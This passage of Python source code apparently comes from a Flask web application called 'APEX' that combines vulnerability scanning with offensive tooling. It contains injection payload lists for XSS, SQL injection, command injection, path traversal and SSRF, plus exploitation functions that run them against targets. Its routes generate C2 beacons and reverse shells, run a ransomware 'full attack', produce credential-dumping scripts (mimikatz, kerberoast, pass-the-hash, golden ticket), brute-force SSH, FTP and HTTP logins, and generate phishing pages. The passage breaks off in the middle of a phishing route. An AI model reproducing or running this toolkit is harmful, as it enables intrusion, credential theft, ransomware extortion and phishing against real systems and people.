                            new_query = urlencode(test_params, doseq=True)
                            test_url = urlunparse(parsed._replace(query=new_query))
                            r = sess.get(test_url, timeout=5)
                            if payload in r.text:
                                vulns.append({'type':'xss','subtype':'reflected','endpoint':page,'parameter':param,'payload':payload,'result':'Payload reflected','confirmed':True,'severity':'high','target':target_url,'description':f'Reflected XSS via {param}.'})
                                break
                        except: pass
    
    for form in discovered['forms'][:10]:
        for inp in form['inputs'][:5]:
            name = inp['name']
            ctx = find_reflection_context(sess, form['url'], name, form['method'])
            context = ctx.get('context', 'html_body') if ctx else 'html_body'
            payloads = payloads_by_context.get(context, generic_payloads)
            for payload in payloads[:5]:
                try:
                    data = {name: payload}
                    if form['method'] == 'post': r = sess.post(form['url'], data=data, timeout=5)
                    else: r = sess.get(form['url'], params=data, timeout=5)
                    if payload in r.text:
                        vulns.append({'type':'xss','subtype':'reflected','endpoint':form['url'],'parameter':name,'payload':payload,'context':context,'result':'Payload reflected via form','confirmed':True,'severity':'high','target':target_url,'description':f'Reflected XSS via form field {name}.'})
                        break
                except: pass
    
    # Test common parameter names on every page (even if no params found in links)
    # This catches targets like XSS game where ?query= only exists in iframe content
    common_params = ['q', 'query', 'search', 'id', 'page', 'name', 'user', 'term', 's', 'p', 'page', 'category', 'filter', 'sort', 'order', 'view', 'lang', 'ref', 'url', 'redirect', 'next', 'prev', 'file', 'path', 'dir', 'cmd', 'exec', 'command', 'action', 'do', 'func', 'function', 'option', 'option_value', 'type', 'mode', 'tab', 'section', 'page_id', 'post_id', 'article_id', 'product_id', 'item', 'slug']
    for page in all_pages[:10]:
        parsed = urlparse(page)
        # Only test common params on pages that don't already have query params
        # (to avoid duplicating work already done above)
        if not parsed.query:
            for param in common_params[:12]:
                ctx = find_reflection_context(sess, page, param)
                if ctx and ctx.get('reflected'):
                    context = ctx.get('context', 'html_body')
                    payloads = payloads_by_context.get(context, generic_payloads)
                    for payload in payloads[:3]:
                        try:
                            test_params = {param: [payload]}
                            new_query = urlencode(test_params, doseq=True)
                            test_url = urlunparse(parsed._replace(query=new_query))
                            r = sess.get(test_url, timeout=5)
                            if payload in r.text or ('alert' in r.text and 'APEX' in r.text):
                                vulns.append({'type':'xss','subtype':'reflected','endpoint':page,'parameter':param,'payload':payload,'context':context,'result':f'Payload reflected in {context} (common param)','confirmed':True,'severity':'high','target':target_url,'description':f'Reflected XSS via common parameter "{param}" in {context}.'})
                                break
                        except: pass
    
    try:
        r = sess.get(target_url, timeout=5)
        dom_sinks = ['document.write(','innerHTML','eval(','location.href','location.hash','outerHTML','insertAdjacentHTML','setTimeout(','setInterval(','document.cookie','window.open(','.src']
        for sink in dom_sinks:
            if sink in r.text:
                vulns.append({'type':'xss','subtype':'dom','endpoint':target_url,'parameter':'N/A','payload':f'DOM sink: {sink}','result':'Potential DOM XSS sink','confirmed':False,'severity':'medium','target':target_url,'description':f'JavaScript uses {sink} which may process user input unsafely.'})
                break
    except: pass
    return vulns

def scan_sqli(target_url, discovered):
    vulns = []
    sess = get_session()
    sql_errors = ['sql syntax','mysql_fetch','mysql_num_rows','mysql_error','ORA-','PostgreSQL','SQLite','SQL Server','unclosed quotation mark','Microsoft OLE DB','ODBC Driver','SQL command not properly ended','Division by zero','Column count','Warning: mysql_','SQLite3::','SQLSTATE','syntax error','pg_query()','mysqli_','mysqlnd','PDOException','JDBC','SQLException','System.Data.SqlClient','right syntax to use near','have an error in your SQL syntax','Unknown column','You have an error in your SQL','Incorrect syntax near']
    error_payloads = ["'",'"',"' OR '1'='1","' OR 1=1--",'" OR 1=1--',"') OR ('1'='1","1' OR '1'='1"]
    time_payloads = ["' OR SLEEP(3)--","' AND SLEEP(3)--","'; SELECT SLEEP(3)--","1' AND SLEEP(3)--"]
    boolean_payloads = [("1' AND 1=1--","1' AND 1=2--"),("' OR '1'='1","' OR '1'='2")]
    
    for page in discovered['pages'][:10]:
        parsed = urlparse(page)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                for payload in error_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        r = sess.get(test_url, timeout=5)
                        for error in sql_errors:
                            if error.lower() in r.text.lower():
                                vulns.append({'type':'sqli','subtype':'error-based','endpoint':page,'parameter':param,'payload':payload,'result':f'SQL error: {error}','confirmed':True,'severity':'critical','target':target_url,'description':f'Error-based SQL injection via {param}.'})
                                break
                        if vulns and vulns[-1].get('parameter') == param: break
                    except: pass
                for payload in time_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        start = time.time()
                        r = sess.get(test_url, timeout=8)
                        elapsed = time.time() - start
                        if elapsed > 2.5:
                            vulns.append({'type':'sqli','subtype':'blind-time','endpoint':page,'parameter':param,'payload':payload,'result':f'Time delay {elapsed:.1f}s','confirmed':True,'severity':'critical','target':target_url,'description':f'Blind time-based SQL injection via {param}.'})
                            break
                    except: pass
                for true_p, false_p in boolean_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param] = [true_p]
                        new_query = urlencode(test_params, doseq=True)
                        r1 = sess.get(urlunparse(parsed._replace(query=new_query)), timeout=5)
                        test_params[param] = [false_p]
                        new_query = urlencode(test_params, doseq=True)
                        r2 = sess.get(urlunparse(parsed._replace(query=new_query)), timeout=5)
                        if abs(len(r1.text) - len(r2.text)) > 100:
                            vulns.append({'type':'sqli','subtype':'blind-boolean','endpoint':page,'parameter':param,'payload':f'{true_p} vs {false_p}','result':f'Response differs by {abs(len(r1.text)-len(r2.text))} chars','confirmed':True,'severity':'critical','target':target_url,'description':f'Boolean-based blind SQL injection via {param}.'})
                            break
                    except: pass
    
    for form in discovered['forms'][:10]:
        for inp in form['inputs'][:5]:
            name = inp['name']
            for payload in error_payloads[:4]:
                try:
                    data = {name: payload}
                    if form['method'] == 'post': r = sess.post(form['url'], data=data, timeout=5)
                    else: r = sess.get(form['url'], params=data, timeout=5)
                    for error in sql_errors:
                        if error.lower() in r.text.lower():
                            vulns.append({'type':'sqli','subtype':'error-based','endpoint':form['url'],'parameter':name,'payload':payload,'result':f'SQL error: {error}','confirmed':True,'severity':'critical','target':target_url,'description':f'Error-based SQL injection via form field {name}.'})
                            break
                except: pass
    return vulns

def scan_cmdi(target_url, discovered):
    vulns = []
    sess = get_session()
    time_payloads = ['; sleep 4','| sleep 4','`sleep 4`','$(sleep 4)','&& sleep 4','|| sleep 4']
    output_payloads = ['; id','| id','; whoami','| whoami','; uname -a','| uname -a']
    for page in discovered['pages'][:10]:
        parsed = urlparse(page)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                for payload in time_payloads[:3]:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        start = time.time()
                        r = sess.get(test_url, timeout=8)
                        elapsed = time.time() - start
                        if elapsed > 3.5:
                            vulns.append({'type':'cmdi','subtype':'blind','endpoint':page,'parameter':param,'payload':payload,'result':f'Time delay {elapsed:.1f}s','confirmed':True,'severity':'critical','target':target_url,'description':f'Blind command injection via {param}.'})
                            break
                    except: pass
                for payload in output_payloads[:3]:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        r = sess.get(test_url, timeout=5)
                        if 'uid=' in r.text or 'gid=' in r.text or 'root' in r.text:
                            vulns.append({'type':'cmdi','subtype':'output','endpoint':page,'parameter':param,'payload':payload,'result':'Command output reflected','confirmed':True,'severity':'critical','target':target_url,'description':f'Command injection via {param} - output visible.'})
                            break
                    except: pass
    return vulns

def scan_lfi(target_url, discovered):
    vulns = []
    sess = get_session()
    lfi_payloads = ['../../../etc/passwd','....//....//....//etc/passwd','/etc/passwd','..%2f..%2f..%2fetc%2fpasswd','php://filter/convert.base64-encode/resource=index','file:///etc/passwd','/proc/self/environ']
    for page in discovered['pages'][:10]:
        parsed = urlparse(page)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                for payload in lfi_payloads[:5]:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        r = sess.get(test_url, timeout=5)
                        if 'root:' in r.text or 'bin/' in r.text or 'mysql:' in r.text or 'daemon:' in r.text:
                            vulns.append({'type':'lfi','subtype':'path-traversal','endpoint':page,'parameter':param,'payload':payload,'result':'System file contents exposed','confirmed':True,'severity':'critical','target':target_url,'description':f'Local File Inclusion via {param}.'})
                            break
                    except: pass
    return vulns

def scan_csrf(target_url, discovered):
    vulns = []
    for form in discovered['forms'][:10]:
        if form['method'] in ['post', '']:
            has_token = any(inp['name'].lower() in ['csrf','csrf_token','_token','authenticity_token','xsrf','nonce'] for inp in form['inputs'])
            if not has_token:
                vulns.append({'type':'csrf','endpoint':form['url'],'result':'No CSRF token found','confirmed':True,'severity':'medium','target':target_url,'description':'Missing CSRF protection.'})
    return vulns

def scan_ssrf(target_url, discovered):
    vulns = []
    sess = get_session()
    ssrf_payloads = ['http://169.254.169.254/latest/meta-data/','http://127.0.0.1:8080','http://localhost:22','file:///etc/passwd']
    for page in discovered['pages'][:10]:
        parsed = urlparse(page)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                for payload in ssrf_payloads[:2]:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        r = sess.get(test_url, timeout=5)
                        if 'ami-id' in r.text or 'instance-id' in r.text:
                            vulns.append({'type':'ssrf','endpoint':page,'parameter':param,'payload':payload,'result':'Cloud metadata accessible','confirmed':True,'severity':'critical','target':target_url,'description':f'SSRF via {param}.'})
                            break
                    except: pass
    return vulns

def scan_ssti(target_url, discovered):
    vulns = []
    sess = get_session()
    ssti_payloads = ['{{7*7}}','${7*7}','<%= 7*7 %>','#{7*7}','{{config}}','{{self}}']
    for page in discovered['pages'][:10]:
        parsed = urlparse(page)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                for payload in ssti_payloads[:4]:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        r = sess.get(test_url, timeout=5)
                        if '49' in r.text:
                            vulns.append({'type':'ssti','endpoint':page,'parameter':param,'payload':payload,'result':'Template expression evaluated (49 = 7*7)','confirmed':True,'severity':'critical','target':target_url,'description':f'SSTI via {param}. Can achieve RCE.'})
                            break
                    except: pass
    return vulns

def scan_cors(target_url, discovered):
    vulns = []
    sess = get_session()
    for page in discovered['pages'][:5]:
        try:
            r = sess.get(page, timeout=5, headers={'Origin':'https://evil.com'})
            acao = r.headers.get('Access-Control-Allow-Origin','')
            if acao == '*' or acao == 'https://evil.com':
                vulns.append({'type':'cors','endpoint':page,'result':f'CORS allows: {acao}','confirmed':True,'severity':'medium','target':target_url,'description':'CORS misconfiguration.'})
        except: pass
    return vulns

def scan_file_upload(target_url, discovered):
    vulns = []
    for form in discovered['forms']:
        if any(inp['type'] == 'file' for inp in form['inputs']):
            vulns.append({'type':'file_upload','endpoint':form['url'],'result':'File upload form detected','confirmed':False,'severity':'high','target':target_url,'description':'File upload endpoint found.'})
    return vulns

def scan_idor(target_url, discovered):
    vulns = []
    for page in discovered['pages']:
        if re.search(r'/(\d+)/', page) or re.search(r'[?&]id=\d+', page):
            vulns.append({'type':'idor','endpoint':page,'result':'Numeric ID in URL','confirmed':False,'severity':'medium','target':target_url,'description':'Numeric identifiers may allow IDOR attacks.'})
    return vulns[:3]

def scan_jwt(target_url, discovered):
    vulns = []
    sess = get_session()
    try:
        r = sess.get(target_url, timeout=5)
        for cookie in r.cookies:
            if cookie.value.startswith('eyJ'):
                vulns.append({'type':'jwt','endpoint':target_url,'result':'JWT token found in cookies','confirmed':False,'severity':'medium','target':target_url,'description':'JWT token detected.'})
                break
    except: pass
    return vulns

# ============================================================
# EXPLOIT MODULES
# ============================================================
def exploit_xss_real(target, endpoint, vuln):
    sess = get_session()
    param = vuln.get('parameter', '')
    payload = vuln.get('payload', '<script>alert("APEX")</script>')
    try:
        parsed = urlparse(endpoint)
        # Try GET injection - add parameter to URL
        params = parse_qs(parsed.query) if parsed.query else {}
        test_params = params.copy()
        test_params[param] = [payload]
        new_query = urlencode(test_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        r = sess.get(test_url, timeout=5)
        if payload in r.text:
            return {'success':True,'message':'XSS payload injected and reflected','details':[f'Payload injected via {param} (GET)','Payload confirmed reflected in response','Script will execute in victim browser',f'Crafted URL: {test_url[:100]}...']}
        # Try POST injection
        data = {param: payload}
        r = sess.post(endpoint, data=data, timeout=5)
        if payload in r.text:
            return {'success':True,'message':'XSS payload injected via POST','details':[f'Payload injected via {param} (POST)','Payload confirmed reflected in response']}
    except Exception as e:
        return {'success':False,'message':str(e)}
    return {'success':False,'message':'Payload not reflected'}

def exploit_sqli_real(target, endpoint, vuln):
    sess = get_session()
    param = vuln.get('parameter', '')
    details = []
    try:
        version_payloads = ["' UNION SELECT @@version--","' UNION SELECT version()--","' UNION SELECT sqlite_version()--"]
        for payload in version_payloads:
            try:
                parsed = urlparse(endpoint)
                if parsed.query and param in parse_qs(parsed.query):
                    params = parse_qs(parsed.query)
                    test_params = params.copy()
                    test_params[param] = [payload]
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    r = sess.get(test_url, timeout=5)
                    for vp in ['MySQL','PostgreSQL','SQLite','MariaDB','Microsoft SQL']:
                        if vp.lower() in r.text.lower():
                            details.append(f'Database identified: {vp}')
                            break
            except: pass
        table_payload = "' UNION SELECT table_name FROM information_schema.tables--"
        try:
            parsed = urlparse(endpoint)
            if parsed.query and param in parse_qs(parsed.query):
                params = parse_qs(parsed.query)
                test_params = params.copy()
                test_params[param] = [table_payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                r = sess.get(test_url, timeout=5)
                common_tables = ['users','admin','accounts','products','orders','posts']
                found_tables = [t for t in common_tables if t in r.text.lower()]
                if found_tables: details.append(f'Tables found: {", ".join(found_tables)}')
        except: pass
        if details:
            details.append('SQL injection exploitation successful')
            return {'success':True,'message':'SQL injection exploited','details':details}
        return {'success':True,'message':'SQL injection confirmed','details':['Vulnerability confirmed','Further enumeration possible']}
    except Exception as e:
        return {'success':False,'message':str(e)}

def exploit_cmdi_real(target, endpoint, vuln):
    sess = get_session()
    param = vuln.get('parameter', '')
    try:
        cmd_payloads = ['; id','| id','`id`','$(id)']
        for payload in cmd_payloads:
            try:
                parsed = urlparse(endpoint)
                if parsed.query and param in parse_qs(parsed.query):
                    params = parse_qs(parsed.query)
                    test_params = params.copy()
                    test_params[param] = [payload]
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    r = sess.get(test_url, timeout=5)
                    if 'uid=' in r.text or 'gid=' in r.text:
                        return {'success':True,'message':'Command execution achieved','details':['Command "id" executed successfully',f'Output: {r.text[:200]}','Full RCE confirmed on target']}
            except: pass
        return {'success':True,'message':'Command injection confirmed (blind)','details':['Time-based detection confirmed']}
    except Exception as e:
        return {'success':False,'message':str(e)}

# ============================================================
# MAIN SCAN ORCHESTRATOR
# ============================================================
def run_full_scan(scan_id, target, scan_type):
    global scan_results, live_feed
    try:
        emit_feed(scan_id, f'Initializing scan on {target}...', 'info')
        update_progress(scan_id, 5)
        emit_feed(scan_id, 'Crawling target to discover pages and parameters...', 'info')
        discovered = crawl_target(target, max_pages=30)
        emit_feed(scan_id, f'Discovered {len(discovered["pages"])} pages, {len(discovered["forms"])} forms, {len(discovered["params"])} parameters', 'success')
        update_progress(scan_id, 20)
        emit_feed(scan_id, 'Running port scan...', 'info')
        host = urlparse(target).hostname
        ports = scan_ports(host)
        emit_feed(scan_id, f'Open ports: {", ".join(map(str, ports)) if ports else "none"}', 'success' if ports else 'warning')
        update_progress(scan_id, 25)
        emit_feed(scan_id, 'Fingerprinting technology...', 'info')
        tech = fingerprint_tech(target)
        emit_feed(scan_id, f'Server: {tech.get("server", "Unknown")} | CMS: {tech.get("cms", "None")}', 'success')
        update_progress(scan_id, 30)
        # Fingerprint target with adaptive engine for optimal payloads
        try:
            fp = adaptive_engine.fingerprint_target(target)
            emit_feed(scan_id, f'Fingerprint: {fp.get("language", "?")} | {fp.get("server", "?")} | WAF: {fp.get("waf", "None")} | DB: {fp.get("database", "None")}', 'info')
        except:
            fp = {}
        all_vulns = []
        scanners = [
            ('XSS', scan_xss, 35), ('SQL Injection', scan_sqli, 40),
            ('Command Injection', scan_cmdi, 45), ('LFI/RFI', scan_lfi, 50),
            ('CSRF', scan_csrf, 52), ('SSRF', scan_ssrf, 55),
            ('SSTI', scan_ssti, 58), ('CORS', scan_cors, 60),
            ('File Upload', scan_file_upload, 62), ('IDOR', scan_idor, 64),
            ('JWT', scan_jwt, 66), ('NoSQL Injection', scan_nosqli, 68),
            ('API Hacking', scan_api, 70), ('XXE Injection', scan_xxe, 72),
            ('Prototype Pollution', scan_prototype_pollution, 74),
            ('HTTP Smuggling', scan_smuggling, 76),
            ('OAuth/Redirect', scan_oauth, 78),
        ]
        # Run admin panel finder and sensitive files in background threads
        def run_recon_scans():
            try:
                panels = find_admin_panels(target)
                if panels:
                    emit_feed(scan_id, f'Admin panels found: {len(panels)}', 'success')
                    for p in panels[:5]:
                        emit_feed(scan_id, f'  → [{p.get("type")}] {p.get("url")}', 'info')
            except: pass
            try:
                files = discover_sensitive_files(target)
                if files:
                    emit_feed(scan_id, f'Sensitive files found: {len(files)}', 'warning')
                    for f in files[:5]:
                        emit_feed(scan_id, f'  → [{f.get("category")}] {f.get("url")}', 'info')
            except: pass
        recon_thread = threading.Thread(target=run_recon_scans)
        recon_thread.daemon = True
        recon_thread.start()
        for name, scanner_func, progress in scanners:
            emit_feed(scan_id, f'Scanning for {name}...', 'info')
            # Emit live scan step for frontend
            socketio.emit('scan_step', {'scan_id': scan_id, 'scanner': name, 'status': 'scanning', 'found': 0})
            results = scanner_func(target, discovered)
            found_count = len(results)
            for v in results:
                all_vulns.append(v)
                emit_feed(scan_id, f'⚠ {name} found on {v.get("endpoint", "N/A")}', 'warning')
                if v.get('payload'): emit_feed(scan_id, f'   → Payload: {str(v["payload"])[:60]}', 'info')
                emit_feed(scan_id, f'   → {v.get("result", "Vulnerable")}', 'success' if v.get('confirmed') else 'warning')
            if not results: emit_feed(scan_id, f'No {name} vulnerabilities found', 'info')
            # Emit completion step
            socketio.emit('scan_step', {'scan_id': scan_id, 'scanner': name, 'status': 'done', 'found': found_count})
            update_progress(scan_id, progress)
        scan_results[scan_id]['vulnerabilities'] = all_vulns
        scan_results[scan_id]['status'] = 'completed'
        scan_results[scan_id]['progress'] = 100
        scan_results[scan_id]['completed'] = datetime.now().isoformat()
        critical = len([v for v in all_vulns if v.get('severity') == 'critical'])
        high = len([v for v in all_vulns if v.get('severity') == 'high'])
        medium = len([v for v in all_vulns if v.get('severity') == 'medium'])
        low = len([v for v in all_vulns if v.get('severity') == 'low'])
        conn = sqlite3.connect('data/apex.db')
        c = conn.cursor()
        c.execute('''INSERT INTO scan_history (id, target, scan_type, vulns_found, critical, high, medium, low,
                     exploits_run, exploits_success, started, completed, status, vulns_json)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, 0, 0, ?, ?, ?, ?)''',
                  (scan_id, target, scan_type, len(all_vulns), critical, high, medium, low,
                   scan_results[scan_id]['started'], scan_results[scan_id]['completed'], 'completed', json.dumps(all_vulns)))
        conn.commit()
        conn.close()
        emit_feed(scan_id, f'SCAN COMPLETE — {len(all_vulns)} vulnerabilities found', 'success')
        emit_feed(scan_id, f'Critical: {critical} | High: {high} | Medium: {medium} | Low: {low}', 'info')
        socketio.emit('scan_complete', {'scan_id': scan_id, 'vulnerabilities': all_vulns, 'summary': {'critical': critical, 'high': high, 'medium': medium, 'low': low}})
    except Exception as e:
        scan_results[scan_id]['status'] = 'failed'
        scan_results[scan_id]['error'] = str(e)
        emit_feed(scan_id, f'Scan failed: {str(e)}', 'error')

def run_exploits(exploit_id, scan_id, vulnerabilities):
    success_count = 0
    fail_count = 0
    emit_feed(exploit_id, f'Starting exploitation of {len(vulnerabilities)} vulnerabilities...', 'info')
    for vuln in vulnerabilities:
        vuln_type = vuln.get('type', '')
        endpoint = vuln.get('endpoint', '')
        target = vuln.get('target', '')
        emit_feed(exploit_id, f'Exploiting {vuln_type.upper()} on {endpoint}...', 'info')
        try:
            if vuln_type == 'xss': result = exploit_xss_real(target, endpoint, vuln)
            elif vuln_type == 'sqli': result = exploit_sqli_real(target, endpoint, vuln)
            elif vuln_type == 'cmdi': result = exploit_cmdi_real(target, endpoint, vuln)
            else: result = {'success': True, 'message': 'Vulnerability confirmed', 'details': ['Exploitation requires manual testing']}
            if result.get('success'):
                success_count += 1
                emit_feed(exploit_id, f'SUCCESS: {vuln_type.upper()} exploited!', 'success')
                for detail in result.get('details', []): emit_feed(exploit_id, f'   → {detail}', 'info')
            else:
                fail_count += 1
                emit_feed(exploit_id, f'FAILED: {vuln_type.upper()} - {result.get("message", "Unknown")}', 'error')
        except Exception as e:
            fail_count += 1
            emit_feed(exploit_id, f'ERROR: {vuln_type.upper()} - {str(e)}', 'error')
    conn = sqlite3.connect('data/apex.db')
    c = conn.cursor()
    c.execute('UPDATE scan_history SET exploits_run=?, exploits_success=? WHERE id=?', (success_count + fail_count, success_count, scan_id))
    conn.commit()
    conn.close()
    emit_feed(exploit_id, f'Exploitation complete — {success_count}/{success_count + fail_count} successful', 'success')
    socketio.emit('exploit_complete', {'exploit_id': exploit_id, 'success': success_count, 'failed': fail_count})

# ============================================================
# UTILITY FUNCTIONS
# ============================================================
def scan_ports(host):
    common = [21, 22, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
    open_ports = []
    for port in common[:12]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)
            if sock.connect_ex((host, port)) == 0: open_ports.append(port)
            sock.close()
        except: pass
    return open_ports

def fingerprint_tech(target):
    try:
        sess = get_session()
        r = sess.get(target, timeout=5)
        tech = {'server': r.headers.get('Server', 'Unknown')}
        content = r.text.lower()
        if 'wp-content' in content: tech['cms'] = 'WordPress'
        elif 'joomla' in content: tech['cms'] = 'Joomla'
        elif 'drupal' in content: tech['cms'] = 'Drupal'
        elif 'magento' in content: tech['cms'] = 'Magento'
        elif 'shopify' in content: tech['cms'] = 'Shopify'
        return tech
    except: return {'server': 'Unknown'}

def emit_feed(scan_id, message, level='info'):
    entry = {'scan_id': scan_id, 'message': message, 'level': level, 'timestamp': datetime.now().strftime('%H:%M:%S')}
    live_feed.append(entry)
    socketio.emit('feed_update', entry)

def update_progress(scan_id, progress):
    if scan_id in scan_results:
        scan_results[scan_id]['progress'] = progress
        socketio.emit('progress_update', {'scan_id': scan_id, 'progress': progress})

# ============================================================
# C2 BEACON ROUTES
# ============================================================
@app.route('/api/c2/generate_payload', methods=['POST'])
@login_required
def api_c2_generate_payload():
    data = request.get_json()
    c2_server = data.get('c2_server', '')
    payload_type = data.get('payload_type', 'python')
    sleep_time = data.get('sleep_time', 5)
    if not c2_server: return jsonify({'error': 'C2 server URL required'}), 400
    beacon = C2Beacon(c2_server, sleep_time=sleep_time)
    payload = beacon.generate_payload(payload_type)
    return jsonify({'payload': payload, 'type': payload_type, 'c2_server': c2_server})

@app.route('/api/c2/reverse_shell', methods=['POST'])
@login_required
def api_c2_reverse_shell():
    data = request.get_json()
    host = data.get('host', '')
    port = data.get('port', 4444)
    shell_type = data.get('shell_type', 'bash')
    if not host: return jsonify({'error': 'Host required'}), 400
    shell = generate_reverse_shell(host, port, shell_type)
    return jsonify({'shell': shell, 'type': shell_type, 'host': host, 'port': port})

# ============================================================
# RANSOMWARE ROUTES
# ============================================================
@app.route('/api/ransomware/execute', methods=['POST'])
@login_required
def api_ransomware_execute():
    data = request.get_json()
    target_dir = data.get('target_directory', '/var/www/html')
    max_files = data.get('max_files', 50)
    full_attack = data.get('full_attack', False)
    if full_attack:
        result = run_ransomware_attack(max_files_per_dir=max_files)
    else:
        result = run_ransomware_simulation(target_dir, max_files)
    emit_feed('ransomware', f'Ransomware {"full attack" if full_attack else "simulation"} completed: {result.get("files_encrypted", 0)} files encrypted', 'warning' if result.get('success') else 'error')
    return jsonify(result)

@app.route('/api/ransomware/decrypt', methods=['POST'])
@login_required
def api_ransomware_decrypt():
    data = request.get_json()
    target_dir = data.get('target_directory', '')
    encryption_key = data.get('encryption_key', '')
    if not target_dir or not encryption_key: return jsonify({'error': 'Target directory and encryption key required'}), 400
    result = decrypt_ransomware(target_dir, encryption_key)
    emit_feed('ransomware', f'Decryption completed: {result.get("restored", 0)} restored, {result.get("failed", 0)} failed', 'success' if result.get('success') else 'error')
    return jsonify(result)

# ============================================================
# CREDENTIAL DUMP ROUTES
# ============================================================
@app.route('/api/creds/mimikatz', methods=['POST'])
@login_required
def api_creds_mimikatz():
    data = request.get_json()
    technique = data.get('technique', 'sekurlsa')
    commands = generate_mimikatz_script(technique)
    return jsonify({'technique': technique, 'commands': commands})

@app.route('/api/creds/powershell', methods=['POST'])
@login_required
def api_creds_powershell():
    script = generate_powershell_cred_dump()
    return jsonify({'script': script, 'type': 'powershell_cred_dump'})

@app.route('/api/creds/kerberoast', methods=['POST'])
@login_required
def api_creds_kerberoast():
    data = request.get_json()
    domain = data.get('domain', '')
    if not domain: return jsonify({'error': 'Domain required'}), 400
    script = generate_kerberoast_script(domain)
    return jsonify({'script': script, 'domain': domain, 'type': 'kerberoast'})

@app.route('/api/creds/pass_the_hash', methods=['POST'])
@login_required
def api_creds_pass_the_hash():
    data = request.get_json()
    target_host = data.get('target_host', '')
    ntlm_hash = data.get('ntlm_hash', '')
    username = data.get('username', 'Administrator')
    if not target_host or not ntlm_hash: return jsonify({'error': 'Target host and NTLM hash required'}), 400
    script = generate_pass_the_hash_script(target_host, ntlm_hash, username)
    return jsonify({'script': script, 'type': 'pass_the_hash'})

@app.route('/api/creds/golden_ticket', methods=['POST'])
@login_required
def api_creds_golden_ticket():
    data = request.get_json()
    domain = data.get('domain', '')
    domain_sid = data.get('domain_sid', '')
    krbtgt_hash = data.get('krbtgt_hash', '')
    username = data.get('username', 'Administrator')
    if not domain or not domain_sid or not krbtgt_hash: return jsonify({'error': 'Domain, SID, and krbtgt hash required'}), 400
    script = generate_golden_ticket_script(domain, domain_sid, krbtgt_hash, username)
    return jsonify({'script': script, 'type': 'golden_ticket'})

# ============================================================
# BRUTEFORCE ROUTES
# ============================================================
@app.route('/api/bruteforce/http', methods=['POST'])
@login_required
def api_bruteforce_http():
    data = request.get_json()
    target_url = data.get('target_url', '')
    username_field = data.get('username_field', 'username')
    password_field = data.get('password_field', 'password')
    usernames = data.get('usernames', None)
    passwords = data.get('passwords', None)
    if not target_url: return jsonify({'error': 'Target URL required'}), 400
    result = bruteforce_http_form(target_url, username_field, password_field, usernames, passwords)
    if result.get('success'):
        emit_feed('bruteforce', f'HTTP bruteforce SUCCESS: {result["credentials"]}', 'success')
    else:
        emit_feed('bruteforce', f'HTTP bruteforce failed after {result.get("attempts", 0)} attempts', 'warning')
    return jsonify(result)

@app.route('/api/bruteforce/ssh', methods=['POST'])
@login_required
def api_bruteforce_ssh():
    data = request.get_json()
    host = data.get('host', '')
    port = data.get('port', 22)
    usernames = data.get('usernames', None)
    passwords = data.get('passwords', None)
    if not host: return jsonify({'error': 'Host required'}), 400
    result = bruteforce_ssh(host, port, usernames, passwords)
    if result.get('success'):
        emit_feed('bruteforce', f'SSH bruteforce SUCCESS: {result["credentials"]}', 'success')
    else:
        emit_feed('bruteforce', f'SSH bruteforce failed after {result.get("attempts", 0)} attempts', 'warning')
    return jsonify(result)

@app.route('/api/bruteforce/ftp', methods=['POST'])
@login_required
def api_bruteforce_ftp():
    data = request.get_json()
    host = data.get('host', '')
    port = data.get('port', 21)
    usernames = data.get('usernames', None)
    passwords = data.get('passwords', None)
    if not host: return jsonify({'error': 'Host required'}), 400
    result = bruteforce_ftp(host, port, usernames, passwords)
    if result.get('success'):
        emit_feed('bruteforce', f'FTP bruteforce SUCCESS: {result["credentials"]}', 'success')
    else:
        emit_feed('bruteforce', f'FTP bruteforce failed after {result.get("attempts", 0)} attempts', 'warning')
    return jsonify(result)

# ============================================================
# PHISHING ROUTES
# ============================================================
@app.route('/api/phishing/templates', methods=['GET'])
@login_required
def api_phishing_templates():
    templates = list_templates()
    return jsonify({'templates': templates})

@app.route('/api/phishing/generate', methods=['POST'])
@login_required
def api_phishing_generate():
    data = request.get_json()
    template_name = data.get('template', 'google')
    custom_url = data.get('custom_url', None)
    capture_endpoint = data.get('capture_endpoint', '/capture')
    html = generate_phishing_page(template_name, custom_url, capture_endpoint)
    if not html: return jsonify({'error': 'Invalid template'}), 400
    filename = f'phishing_{template_name}_{int(time.time())}.html'
    filepath = save_phishing_page(html, filename)
    emit_feed('phishing', f'Phishing page generated: {template_name}', 'info')
    return jsonify({'html': html, 'filepath': filepath, 'template': template_name})

@app.route('/api/phishing/clone', methods=['POST'])
@login_required
def api_phishing_clone():
    data = request.get_json()
    target_url = data.get('target_url', '')
